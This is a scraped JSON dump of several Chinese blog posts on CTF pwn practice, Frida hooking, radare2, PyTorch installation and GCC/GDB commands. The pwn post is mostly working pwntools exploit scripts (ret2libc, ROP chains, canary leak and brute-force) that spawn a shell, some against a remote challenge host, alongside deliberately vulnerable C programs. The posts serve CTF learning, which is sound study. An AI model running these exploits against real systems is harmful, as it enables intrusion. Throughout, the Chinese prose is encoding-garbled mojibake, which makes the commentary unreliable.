flat([112*\u0026#39;A\u0026#39;,sym_plt_addr,\u0026#39;b\u0026#39;*4,binsh_addr]) # \u0026#39;bbbb\u0026#39; ä½œä¸ºå‡½æ•°è°ƒç”¨æ ˆè¿”å›åœ°å€çš„è™šå‡çš„åœ°å€ io.sendline(payload) io.interactive() eg2:\nret2libc2\nç¼ºå°‘/bin/sh åªèƒ½è‡ªå·±å¯»æ‰¾gadgetsæ¥è¿›è¡Œæ„é€ ã€‚\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * # io = process(\u0026#39;./ret2libc2\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10007) # binsh_addr = 0x08048720 sym_plt_addr = 0x08048490 sym_imp_gets_addr = 0x08048460 pop_ebx_addr = 0x0804872f buf2_addr = 0x804a080 payload = flat([\u0026#34;A\u0026#34;*112,sym_imp_gets_addr,pop_ebx_addr,buf2_addr,sym_plt_addr,\u0026#39;x\u0026#39;*4,buf2_addr]) io.sendline(payload) io.sendline(\u0026#34;/bin/sh\u0026#34;) io.interactive() eg3:\nret2libc3\n2çš„åŸºç¡€ä¸Šå»æ‰äº†systemçš„åœ°å€ã€‚\ngot è¡¨æ³„éœ²libcçš„å‡½æ•°åœ°å€\nåˆ©ç”¨æ€è·¯ï¼š\næ³„éœ² __libc_start_main åœ°å€\nè·å– libc ç‰ˆæœ¬\nè·å– system åœ°å€ä¸ /bin/sh çš„åœ°å€\nå†æ¬¡æ‰§è¡Œæºç¨‹åº\nè§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜/bin/shâ€™)\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from pwn import * from LibcSearcher import LibcSearcher context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # io = process(\u0026#39;./ret2libc3\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10008) elf = ELF(\u0026#39;./ret2libc3\u0026#39;) puts_plt = elf.plt[\u0026#39;puts\u0026#39;] start_main_got = elf.got[\u0026#39;__libc_start_main\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] payload = flat([\u0026#34;A\u0026#34;*112,puts_plt,main,start_main_got]) io.sendlineafter(\u0026#34;Can you find it !?\u0026#34;,payload) libc_start_main_addr = u32(io.recv()[0:4]) libc = LibcSearcher(\u0026#39;__libc_start_main\u0026#39;,libc_start_main_addr) libcbase = libc_start_main_addr-libc.dump(\u0026#34;__libc_start_main\u0026#34;) sym_addr = libcbase+libc.dump(\u0026#39;system\u0026#39;) binsh_addr = libcbase+libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = flat([\u0026#34;A\u0026#34;*112,sym_addr,\u0026#34;bbbb\u0026#34;,binsh_addr]) io.sendline(payload) io.interactive() ä¸­çº§ROP ret2csu åˆ©ç”¨ x64 ä¸‹çš„ __libc_csu_init ä¸­çš„ gadgets.\neg:level5:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #undef _FORTIFY_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void vulnerable_function() { char buf[128]; read(STDIN_FILENO, buf, 512); } int main(int argc, char** argv) { write(STDOUT_FILENO, \u0026#34;Hello, World\\n\u0026#34;, 13); vulnerable_function(); } exp:\nret2reg ç•¥ æ— é¢˜ç›® BROP ç•¥ æ— äºŒè¿›åˆ¶ é«˜çº§ROP ret2_dl_runtime_resolve XDCTF2015-pwn200\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void vuln() { char buf[100]; setbuf(stdin, buf); read(0, buf, 256); } int main() { char buf[100] = \u0026#34;Welcome to XDCTF2015~!\\n\u0026#34;; setbuf(stdout, buf); write(1, buf, strlen(buf)); vuln(); return 0; } //gcc -o bof -m32 -fno-stack-protector bof.c SROP ret2VDSO èŠ±å¼æ ˆæº¢å‡º stack pivoting X-CTF Quals 2016 - b0verfl0w\nè½¬ç§»å †ï¼šEkoPartyCTF 2016 fuckzing-exploit-200\nframe faking 2018 å®‰æ’æ¯ over\nç›´æ¥EXP åˆ†æï¼Œï¼Œå›°æ‰°äº†å¾ˆä¹…çš„exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from pwn import * context.binary = \u0026#34;./over.over\u0026#34; def DEBUG(cmd): raw_input(\u0026#34;DEBUG: \u0026#34;) gdb.attach(io, cmd) io = process(\u0026#34;./over.over\u0026#34;) elf = ELF(\u0026#34;./over.over\u0026#34;) libc = elf.libc io.sendafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;a\u0026#39; * 80) stack = u64(io.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6: ].ljust(8, \u0026#39;\\0\u0026#39;)) - 0x70 success(\u0026#34;stack -\u0026gt; {:#x}\u0026#34;.format(stack)) # DEBUG(\u0026#34;b *0x4006B9\\nc\u0026#34;) 96 io.sendafter(\u0026#34;\u0026gt;\u0026#34;, flat([\u0026#39;11111111\u0026#39;, 0x400793, elf.got[\u0026#39;puts\u0026#39;], elf.plt[\u0026#39;puts\u0026#39;], 0x400676, (80 - 40) * \u0026#39;1\u0026#39;, stack, 0x4006be])) libc.address = u64(io.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6: ].ljust(8, \u0026#39;\\0\u0026#39;)) - libc.sym[\u0026#39;puts\u0026#39;] success(\u0026#34;libc.address -\u0026gt; {:#x}\u0026#34;.format(libc.address)) pop_rdi_ret=0x400793 \u0026#39;\u0026#39;\u0026#39; $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \u0026#34;pop|ret\u0026#34; 0x00000000000f5279 : pop rdx ; pop rsi ; ret \u0026#39;\u0026#39;\u0026#39; pop_rdx_pop_rsi_ret=libc.address+0xf5279 payload=flat([\u0026#39;22222222\u0026#39;, pop_rdi_ret, next(libc.search(\u0026#34;/bin/sh\u0026#34;)),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym[\u0026#39;execve\u0026#39;], (80 - 7*8 ) * \u0026#39;2\u0026#39;, stack - 0x30, 0x4006be]) io.sendafter(\u0026#34;\u0026gt;\u0026#34;, payload) io.interactive() Stack smash 35c3 CTF readme\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * addr_ow_flag = 0x600d20 addr_flag = 0x400d20 H,P = \u0026#39;localhost\u0026#39;, 6666 #r = process(\u0026#39;./readme.bin\u0026#39;) r = remote(H,P) junk = r.recvuntil(\u0026#34;What\u0026#39;s your name? \u0026#34;) exploit = \u0026#34;A\u0026#34;*0x218 exploit += p64(addr_flag) exploit += p64(0) exploit += p64(addr_ow_flag) r.sendline(exploit) junk += r.recvuntil(\u0026#34;Please overwrite the flag: \u0026#34;) exploit = \u0026#34;LIBC_FATAL_STDERR_=1\u0026#34; r.sendline(exploit) junk += r.recvall() print junk æ ˆä¸Špartial overwrite 2018 å®‰æ’æ¯ babypie\n2018 XNUCA-gets\nCanary ç»•è¿‡æŠ€æœ¯ æ³„éœ²æ ˆä¸­çš„Canary\nè¦†ç›– Canary çš„ä½å­—èŠ‚ï¼Œæ¥æ‰“å°å‡ºå‰©ä½™çš„ Canary éƒ¨åˆ†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // ex2.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void getshell(void) { system(\u0026#34;/bin/sh\u0026#34;); } void init() { setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); } void vuln() { char buf[100]; for(int i=0;i\u0026lt;2;i++){ read(0, buf, 0x200); printf(buf); } } int main(void) { init(); puts(\u0026#34;Hello Hacker!\u0026#34;); vuln(); return 0; } EXP\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/usr/bin/env python from pwn import * context.binary = \u0026#39;ex2\u0026#39;#å…¨å±€ç³»ç»Ÿè‡ªåŠ¨è®¾ç½®ï¼Œä¸ºå®˜æ–¹æ¨èè®¾ç½®ï¼Œex2ä¸ºæ–‡ä»¶åç§°ã€‚ #context.log_level = \u0026#39;debug\u0026#39;#debugæ¨¡å¼ä¸‹æ‰å¼€å¯ io = process(\u0026#39;./ex2\u0026#39;) #æœ¬åœ°è¿æ¥åˆ°ex2 get_shell = ELF(\u0026#34;./ex2\u0026#34;).sym[\u0026#34;getshell\u0026#34;] #ç”±äºæºç é‡Œæœ‰getshellå‡½æ•°ï¼Œæ‰€ä»¥ç›´æ¥å¯ä»¥ä½¿ç”¨ELFæ¨¡å—æ‰¾åˆ°getshellå‡½æ•°åœ°å€ã€‚ io.recvuntil(\u0026#34;Hello Hacker!\\n\u0026#34;)#æ¥å—ä¼ æ¥çš„ç¬¬ä¸€éƒ¨åˆ†å­—ç¬¦ # leak Canary payload = \u0026#34;A\u0026#34;*100 io.sendline(payload) #ä¼ è¾“100ä¸ªA io.recvuntil(\u0026#34;A\u0026#34;*100) Canary = u32(io.recv(4))-0xa #å› ä¸ºcannaryæœ€åä¸€ä½å­—èŠ‚ä¸º00è¢«0x0aè¦†ç›–ï¼Œæ‰€ä»¥å‡å»0x0a log.info(\u0026#34;Canary:\u0026#34;+hex(Canary))#æ—¥å¿—è®°å½•ä¸‹canary # Bypass Canary payload = \u0026#34;\\x90\u0026#34;*100+p32(Canary)+\u0026#34;\\x90\u0026#34;*12+p32(get_shell)#å‘é€æœ€åçš„payload io.send(payload) io.recv() io.interactive() one-by-one çˆ†ç ´ Canary\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 print \u0026#34;[+] Brute forcing stack canary \u0026#34; start = len(p) stop = len(p)+8 while len(p) \u0026lt; stop: for i in xrange(0,256): res = send2server(p + chr(i)) if res != \u0026#34;\u0026#34;: p = p + chr(i) #print \u0026#34;\\t[+] Byte found 0x%02x\u0026#34; % i break if i == 255: print \u0026#34;[-] Exploit failed\u0026#34; sys.exit(-1) canary = p[stop:start-1:-1].encode(\u0026#34;hex\u0026#34;) print \u0026#34; [+] SSP value is 0x%s\u0026#34; % canaryåŠ«æŒ__stack_chk_fail å‡½æ•°\nè¦†ç›– TLS ä¸­å‚¨å­˜çš„ Canary å€¼\n","date":"2019-02-20T00:00:00+08:00","permalink":"https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/","title":"CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_1æ ˆæº¢å‡º"},{"content":"Fridaä»å…¥é—¨åˆ°æ”¾å¼ƒ_2(å¾…è¡¥å……) 0x00 å‰è¨€ å¤ä¹ ä¸€ä¸‹Androidå®‰è£…fridaå‘½ä»¤\n1 2 3 4 adb root adb push frida-server /data/local/tmp adb shell \u0026#34;chmod 755 /data/local/tmp/frida-server\u0026#34; adb shell \u0026#34;/data/local/tmp/frida-server \u0026amp;\u0026#34; å¸¸ç”¨Frida å‘½ä»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 frida-ps -U #åˆ—å‡ºUSBè®¾å¤‡è¿è¡Œingçš„è¿›ç¨‹ frida-ps -Ua #åˆ—å‡ºè¿è¡Œä¸­çš„åº”ç”¨ frida-ps -Uai #åˆ—å‡ºå·²å®‰è£…çš„åº”ç”¨åˆ—è¡¨ frida-ps -D xxx #è¿æ¥æŒ‡å®šçš„è®¾å¤‡ frida-ps -R #åœ¨Safariä¸­è·Ÿè¸ªrecv*å’Œsend* API frida-trace -i \u0026#34;recv*\u0026#34; -i \u0026#34;send\u0026#34; Safari #åœ¨Safariä¸­è·Ÿè¸ªObjCæ–¹æ³•è°ƒç”¨ frida-trace -m \u0026#34;-[NSView drawRect:]\u0026#34; Safari #åœ¨iPhoneä¸Šå¯åŠ¨SnapChatï¼Œè·Ÿè¸ªåŠ å¯†APIè°ƒç”¨ frida-trace -U -f com.app.testing -I \u0026#34;libcommonCrypto*\u0026#34; #å½“ç¨‹åºå¯åŠ¨æ—¶ï¼Œfridaè·Ÿè¸ªæ‰€æœ‰open function frida-trace -U -i open com.app.testing ä¸‹é¢é€šè¿‡è‡ªå·±åˆ›å»ºä¸€ä¸ªAndroid APPæ¥å­¦ä¹ Fridaåœ¨Androidä¸Šçš„ä¸€èˆ¬ç”¨æ³•ã€‚\n0x01 ç®€å•ç”¨ä¾‹ Fridaå¸¸ç”¨çš„ä¸¤ç§å¯åŠ¨æ–¹å¼ï¼š\npython ç»‘å®šå¯åŠ¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import frida import sys,os ## package name pkg_name = \u0026#34;com.example.xxx\u0026#34; js_hook_file = \u0026#34;xxx.js\u0026#34; def on_message(message,data): if message[\u0026#39;type\u0026#39;] == \u0026#39;send\u0026#39;: print(\u0026#34;[*] {0}\u0026#34;.format(message[\u0026#39;payload\u0026#39;])) else: print(message) ## æ’å…¥jsä»£ç  or åŠ è½½jsæ–‡ä»¶ jscode = \u0026#34;\u0026#34; script = \u0026#34;\u0026#34; process = frida.get_usb_device().attach(pkg_name) with open(js_hook_file,\u0026#34;r\u0026#34;) as f: script = process.create_script(f.read()) script.on(\u0026#39;message\u0026#39;, on_message) script.load() sys.stdin.read() 1 2 3 4 5 console.log(\u0026#34;Script loaded successfully \u0026#34;); Java.perform(function x() { //hookä»£ç  }); ç›´æ¥å‘½ä»¤åŠ è½½è„šæœ¬å¯åŠ¨ 1 frida -U -l xxx.js com.example.xxx 0x02 Appæºç  javaå±‚\nnativeå±‚\n0x03 Javaå±‚hook HOOKä»£ç \n0x04 Nativeå±‚hook nativeå±‚ä»£ç \n0x05 æ€»ç»“ æºä»£ç åœ°å€ï¼š\n0x06 å‚è€ƒ https://www.freebuf.com/articles/system/190565.html\nhttps://blog.csdn.net/jiangwei0910410003/article/details/80372118\nhttps://github.com/dweinstein/awesome-frida\n","date":"2019-02-02T00:00:00+08:00","permalink":"https://ykiko.top/p/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_2%E5%BE%85%E8%A1%A5%E5%85%85/","title":"Fridaä»å…¥é—¨åˆ°æ”¾å¼ƒ_2(å¾…è¡¥å……)"},{"content":"Fridaä»å…¥é—¨åˆ°æ”¾å¼ƒ_1ï¼ˆé‡ç½®ï¼‰ 0x00 Frida Frida å®˜ç½‘ï¼šhttps://www.frida.re/\ngithub: https://github.com/frida/frida\nDynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.\nScriptable\nPortable\nFree\nBattle-tested\n0x01 å®‰è£… äºŒè¿›åˆ¶å®‰è£… (æ¨è) pip install frida-tools å°±ä¸€ä¸ªå‘½ä»¤æå®š\nFailed to load the Frida native extension: DLL load failed: æ‰¾ä¸åˆ°æŒ‡å®šçš„æ¨¡å—\næŠ¥äº†è¿™ä¸ªé”™ æŸ¥äº†å¤§åŠå¤© åŸæ¥æˆ‘ç”¨çš„ç‰ˆæœ¬æ˜¯åŸºäºpython3.7ç¼–è¯‘çš„ã€‚æˆ‘ç°åœ¨ç”¨çš„3.6.ã€‚ã€‚ã€‚ã€‚ ç»‘å®šï¼šäºŒé€‰ä¸€å°±è¡Œ\n1 2 pip install frida # Python bindings npm install frida # Node.js bindings æ‰‹åŠ¨ç¼–è¯‘ ä¾èµ–ï¼š\npip3 install colorama prompt-toolkit pygments\nLinux make\nMacOS and iOS 1 2 3 export MAC_CERTID=frida-cert export IOS_CERTID=frida-cert make Windows 1 frida.sln #VS2017 0x02 Androidç¯å¢ƒ è®¾å¤‡ï¼šå°ç±³mix2 è¿è¡ŒAndroid9.0 MIUI10å¼€å‘ç‰ˆå·²è§£é”root\nfrida-server: ç”¨çš„arm64ç‰ˆæœ¬\nserveræ–‡ä»¶ä¸‹è½½\nä¸‹è½½å¥½å¯¹åº”çš„ frida-server ç„¶åadb push è¿›å»\nadb push frida-server /data/local/tmp\nç„¶åchomd 755 frida-serverä¿®æ”¹æƒé™\nè¿è¡Œ./frida-server\nfrida-server\nè¿™å‡ ä¸ªå‘½ä»¤ï¼š\n1 2 3 4 adb root adb push frida-server /data/local/tmp adb shell \u0026#34;chmod 755 /data/local/tmp/frida-server\u0026#34; adb shell \u0026#34;/data/local/tmp/frida-server \u0026amp;\u0026#34; æŸ¥çœ‹æ¶æ„ï¼š\naarch64\n0x03 ç®€å•æµ‹è¯• å‘½ä»¤è¡Œè¿è¡Œfrida-ps -U\nfrida-ps\næœ‰æ˜¾ç¤ºå°±æ˜¯è¿æ¥æˆåŠŸ\næ¥ä¸‹æ¥å¯¹æµè§ˆå™¨è¿›è¡Œç®€å•æµ‹è¯•\nfrida-trace -U -i open com.android.browser\néšä¾¿ç‚¹ä¸€ä¸‹æµè§ˆå™¨\næµ‹è¯•Diva\nfrida-trace -U -i \u0026quot;open*\u0026quot; jakhar.aseem.diva\nè¿›è¡ŒHook login.class checkoutå‡½æ•°\né€†å‘è¿‡ç¨‹ç•¥\nHOOKè„šæœ¬ï¼š\n1 2 3 4 5 6 7 Java.perfrom(function(){ console.log(\u0026#34;######\u0026#34;) var logActivity = Java.use(\u0026#34;jakhar.aseem.diva.LogActivity\u0026#34;); logActivity.checkout.implementation = function(){ console.log(\u0026#34;Hook\u0026#34;) } }) å‘½ä»¤è¡Œè½½å…¥è„šæœ¬è¿è¡Œ\nfrida -U jakhar.aseem.diva -l diva1.js --no-pause\nè¿›å…¥loggingå…³å¡ ç‚¹å‡»check outï¼ŒæˆåŠŸhookåˆ°checkoutå‡½æ•°ã€‚\n0x04 æ€»ç»“ ç®—æ˜¯ç®€å•çš„å…¥é—¨äº†fridaã€‚\nfridaè¿˜æœ‰å¾ˆå¤šå‰å®³çš„åŠŸèƒ½ã€‚å¤šè¯»è¯»å®˜æ–¹æ–‡æ¡£ï¼Œæ”¶è´§ä¼šæ›´å¤šã€‚\n","date":"2019-01-22T00:00:00+08:00","permalink":"https://ykiko.top/p/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_1%E9%87%8D%E7%BD%AE/","title":"Fridaä»å…¥é—¨åˆ°æ”¾å¼ƒ_1ï¼ˆé‡ç½®ï¼‰"},{"content":"radare2+cutterä½¿ç”¨æŒ‡å— 0x00 ä»‹ç» radare2 ä¸€ä¸ªå¾ˆå®ç”¨çš„äºŒè¿›åˆ¶åˆ†æå’Œè°ƒè¯•å·¥å…·\ncutter æ˜¯r2çš„GUIç‰ˆã€‚\n0x01 å®‰è£… æ”¯æŒçš„å¹³å°æœ‰å¦‚ä¸‹ï¼š\nWindows (since XP), GNU/Linux, OS X, [Net|Free|Open]BSD, Android, iOS, OSX, QNX, Solaris, Haiku, FirefoxOS.\nLinuxå¹³å°ä¸‹ç›´æ¥\n1 git clone https://github.com/radare/radare2cd radare2sys/install.sh //(or sys/user.sh) Windowsä¸‹å¯ä»¥ä¸‹è½½äºŒè¿›åˆ¶å®‰è£…åŒ…å®‰è£…ã€‚å®˜ç½‘ä¸‹è½½\nWindowsç”¨æˆ·æ¨èä½¿ç”¨Windowsä¸‹çš„linuxï¼ˆwslï¼‰æ¥ä½¿ç”¨ï¼Œ winä¸‹æ›´æ–°æ…¢ã€‚è¿˜æ˜¯linuxä¸‹ç”¨å¾—èˆ’æœï¼ˆæ–¹ä¾¿ï¼Œå¿«æ·ï¼‰ã€‚\n0x03 å·¥å…·ä»‹ç» r2å¸¸ç”¨çš„åŒ…å«æœ‰ä¸€ä¸‹ç»„ä»¶ï¼š\nrax2 ç”¨äºæ•°å€¼è½¬æ¢\nrasm2 åæ±‡ç¼–å’Œæ±‡ç¼–\nrabin2 æŸ¥çœ‹æ–‡ä»¶æ ¼å¼\nradiff2 å¯¹æ–‡ä»¶è¿›è¡Œ diff\nragg2/ragg2Â­cc å¼€å‘shellcodeå·¥å…·\nrahash2 å„ç§å¯†ç ç®—æ³•ï¼Œ hashç®—æ³•\nradare2 æ•´åˆäº†æ‰€æœ‰å·¥å…·\nä½¿ç”¨å¸®åŠ©ç›´æ¥-h\nrax2 rasm2 rabin2 eg: (-I)\nradiff2 ragg2/ragg2Â­cc rahash2 radare2 (æœ€å¸¸ç”¨) å¯ç¼©å†™ä¸ºr2 0x04 r2 å®æˆ˜å­¦ä¹  challengeæ¥æºäºï¼šhttp://reversing.kr\nå…ˆæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ä¿¡æ¯ï¼š\nGUI?:\nç”¨r2è½½å…¥ï¼Œè‡ªåŠ¨åˆ†æaaaå‘½ä»¤ï¼š\nvv å‘½ä»¤æŸ¥çœ‹ç•Œé¢ï¼š\næ³¨æ„0x00401080 è°ƒç”¨äº†GetDlgItemTextA\ns è°ƒåˆ°mainå‡½æ•°ï¼ŒæŸ¥çœ‹mainçš„æ±‡ç¼–ä»£ç ï¼š\npdcæŸ¥çœ‹ä¼ªä»£ç ï¼š\nå¤§å†™çš„VVå‘½ä»¤æŸ¥çœ‹å›¾å½¢ç•Œé¢ ä½¿ç”¨hijkæ¥è¿›è¡Œç•Œé¢ç§»åŠ¨ã€‚\nçœ‹åˆ°è°ƒç”¨åœ°å€0x401020ï¼Œsè·³è¿‡å» ï¼›å‘ç°æ²¡è§£æ å¯ä½¿ç”¨afæ¥è§£æã€‚\nçœ‹åˆ°GetDlgTemTextAè°ƒç”¨ï¼š\nå‡½æ•°è°ƒç”¨\nå·®ä¸å¤šé€»è¾‘å°±æ˜¯ä¸€ç›´æ¯”å¯¹å­—ç¬¦ä¸²ï¼Œä»ç¬¬äºŒä½å¼€å§‹æ¯”æœ€åç¬¬ä¸€ä½\nå¾—åˆ°Ea5yR3versing\nå‘½ä»¤è®°ä¸ä½æˆ–è€…æƒ³çŸ¥é“æœ‰äº›ä»€ä¹ˆå‘½ä»¤å¯ä»¥ç”¨å°±å¯ä»¥åŠ ä¸ªï¼Ÿå·æŸ¥è¯¢\n0x05 Cutterçš„ä½¿ç”¨ å¤šå›¾å¾…è¡¥ Radare2 Book\n","date":"2019-01-02T00:00:00+08:00","permalink":"https://ykiko.top/p/radare2-cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","title":"radare2+cutterä½¿ç”¨æŒ‡å—"},{"content":"pytorchå­¦ä¹ _1å®‰è£… å‰è¨€ æœ¬æ¥æƒ³ç€ç”¨tensorflowçš„ ç„¶è€ŒGPUç‰ˆæ€»æ˜¯æŠ¥å„ç§å„æ ·çš„BUG\næ‰€ä»¥æ‰“ç®—å…¥å‘ä¸€ä¸‹å­¦pytorch\né…ç½®ï¼šwin10+i76700HQ+GTX1060+16G\nè½¯ä»¶ç‰ˆæœ¬ï¼šCUDA10+python3.6+pytorch 1 æºç ç¼–è¯‘\nå°è¯•1ï¼šå®˜æ–¹å®‰è£…æ–¹æ³•ä¸æ”¯æŒ CUDA 10 å¤ªå‘ï¼Œç¤¾åŒºæœ‰ç¼–è¯‘é€šè¿‡çš„ï¼Œæ‰€ä»¥åªæœ‰è‡ªå·±ç¼–è¯‘è¯•è¯•\næŠ¥å„ç§å¼‚å¸¸ï¼Œä½†æ˜¯æ²¡åœï¼Œé‚£å°±ç­‰ç­‰\nCPUè¢«å æ»¡ï¼Œå·¨å¡ã€‚\nä¸€è§‰èµ·æ¥ä¹‹åï¼šå®‰è£…å¤±è´¥\nå°è¯•2ï¼šç­‰ç€å®Œå…¨æ”¯æŒCUDA10ä¹‹ååœ¨ç”¨GPUè·‘å§ã€‚\nå¦¥åï¼šç”¨é˜¿é‡Œäº‘çš„å­¦ç”ŸæœåŠ¡å™¨è£…äº†CPUçš„ç‰ˆæœ¬ï¼šé¡ºä¾¿æŠŠTensorFlow ä¹Ÿç»™è£…äº†ã€‚ã€‚\nç„¶è€Œ åœ¨ä¸€ä¸ªæ˜ŸæœŸä¹‹å pytorch1.0å‡ºæ¥äº† æ”¯æŒäº†CUDA10 nice\n1 2 pip3 install http://download.pytorch.org/whl/cu100/torch-1.0.0-cp36-cp36m-win_amd64.whl pip3 install torchvision æœŸé—´æ²¡æœ‰é‡åˆ°ä»»ä½•é—®é¢˜ çœŸèˆ’ç•…ã€‚ã€‚ã€‚\n","date":"2018-12-08T00:00:00+08:00","permalink":"https://ykiko.top/p/pytorch%E5%AD%A6%E4%B9%A0_1%E5%AE%89%E8%A3%85/","title":"pytorchå­¦ä¹ _1å®‰è£…"},{"content":"PWN_å°toolsçš„ä½¿ç”¨ GCC ç¼–è¯‘å¸¸ç”¨å‘½ä»¤ ä¸å¸¦é€‰é¡¹ gcc test.c å°†test.cé¢„å¤„ç†ã€æ±‡ç¼–ã€ç¼–è¯‘å¹¶é“¾æ¥å½¢æˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚è¿™é‡ŒæœªæŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œé»˜è®¤è¾“å‡ºä¸ºa.outã€‚ -o æŒ‡å®šç”Ÿæˆçš„è¾“å‡ºæ–‡ä»¶ï¼› gcc test.c -o test å°†test.cé¢„å¤„ç†ã€æ±‡ç¼–ã€ç¼–è¯‘å¹¶é“¾æ¥å½¢æˆå¯æ‰§è¡Œæ–‡ä»¶testã€‚-oé€‰é¡¹ç”¨æ¥æŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„æ–‡ä»¶åã€‚ -E ä»…æ‰§è¡Œç¼–è¯‘é¢„å¤„ç†ï¼› gcc -E test.c -o test.i å°†test.cé¢„å¤„ç†è¾“å‡ºtest.iæ–‡ä»¶ã€‚ -S å°†Cä»£ç è½¬æ¢ä¸ºæ±‡ç¼–ä»£ç ï¼› gcc -S test.i å°†é¢„å¤„ç†è¾“å‡ºæ–‡ä»¶test.iæ±‡ç¼–æˆtest.sæ–‡ä»¶ã€‚ -c ä»…æ‰§è¡Œç¼–è¯‘æ“ä½œï¼Œä¸è¿›è¡Œè¿æ¥æ“ä½œã€‚ gcc -c test.s å°†æ±‡ç¼–è¾“å‡ºæ–‡ä»¶test.sç¼–è¯‘è¾“å‡ºtest.oæ–‡ä»¶ã€‚ -wall æ˜¾ç¤ºè­¦å‘Šä¿¡æ¯ï¼› **æ— é€‰é¡¹é“¾æ¥** gcc test.o -o test å°†ç¼–è¯‘è¾“å‡ºæ–‡ä»¶test.oé“¾æ¥æˆæœ€ç»ˆå¯æ‰§è¡Œæ–‡ä»¶testã€‚ -O ä½¿ç”¨ç¼–è¯‘ä¼˜åŒ–çº§åˆ«1ç¼–è¯‘ç¨‹åºã€‚çº§åˆ«ä¸º1~3ï¼Œçº§åˆ«è¶Šå¤§ä¼˜åŒ–æ•ˆæœè¶Šå¥½ï¼Œä½†ç¼–è¯‘æ—¶é—´è¶Šé•¿ gcc -O1 test.c -o test å…³æ‰DEP/NXï¼ˆå †æ ˆä¸å¯æ‰§è¡Œï¼‰ gcc -z execstack -o level level.c å…³æ‰Stack Protector/Canaryï¼ˆæ ˆä¿æŠ¤ï¼‰ gcc -fno-stack-protector -o level level.c å…³æ‰ç¨‹åºASLR/PIEï¼ˆç¨‹åºéšæœºåŒ–ä¿æŠ¤ï¼‰ gcc -no-pie level level.c 64ä½linuxä¸‹é¢çš„GCCç¼–è¯‘å‡ºä¸€ä¸ª32ä½å¯æ‰§è¡Œç¨‹åº gcc -m32 -z execstack -fno-stack-protector -o level level.c GDBå¸¸ç”¨è°ƒè¯•å‘½ä»¤ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 gcc -g main.c //åœ¨ç›®æ ‡æ–‡ä»¶åŠ å…¥æºä»£ç çš„ä¿¡æ¯ gdb a.out (gdb) start //å¼€å§‹è°ƒè¯• (gdb) n //ä¸€æ¡ä¸€æ¡æ‰§è¡Œ (gdb) step/s //æ‰§è¡Œä¸‹ä¸€æ¡ï¼Œå¦‚æœå‡½æ•°è¿›å…¥å‡½æ•° (gdb) backtrace/bt //æŸ¥çœ‹å‡½æ•°è°ƒç”¨æ ˆå¸§ (gdb) info/i locals //æŸ¥çœ‹å½“å‰æ ˆå¸§å±€éƒ¨å˜é‡ (gdb) frame/f //é€‰æ‹©æ ˆå¸§ï¼Œå†æŸ¥çœ‹å±€éƒ¨å˜é‡ (gdb) print/p //æ‰“å°å˜é‡çš„å€¼ (gdb) finish //è¿è¡Œåˆ°å½“å‰å‡½æ•°è¿”å› (gdb) set var sum=0 //ä¿®æ”¹å˜é‡å€¼ (gdb) list/l è¡Œå·æˆ–å‡½æ•°å //åˆ—å‡ºæºç  (gdb) display/undisplay sum //æ¯æ¬¡åœä¸‹æ˜¾ç¤ºå˜é‡çš„å€¼/å–æ¶ˆè·Ÿè¸ª (gdb) break/b è¡Œå·æˆ–å‡½æ•°å //è®¾ç½®æ–­ç‚¹ (gdb) continue/c //è¿ç»­è¿è¡Œ (gdb) info/i breakpoints //æŸ¥çœ‹å·²ç»è®¾ç½®çš„æ–­ç‚¹ (gdb) delete breakpoints 2 //åˆ é™¤æŸä¸ªæ–­ç‚¹ (gdb) disable/enable breakpoints 3 //ç¦ç”¨/å¯ç”¨æŸä¸ªæ–­ç‚¹ (gdb) break 9 if sum != 0 //æ»¡è¶³æ¡ä»¶æ‰æ¿€æ´»æ–­ç‚¹ (gdb) 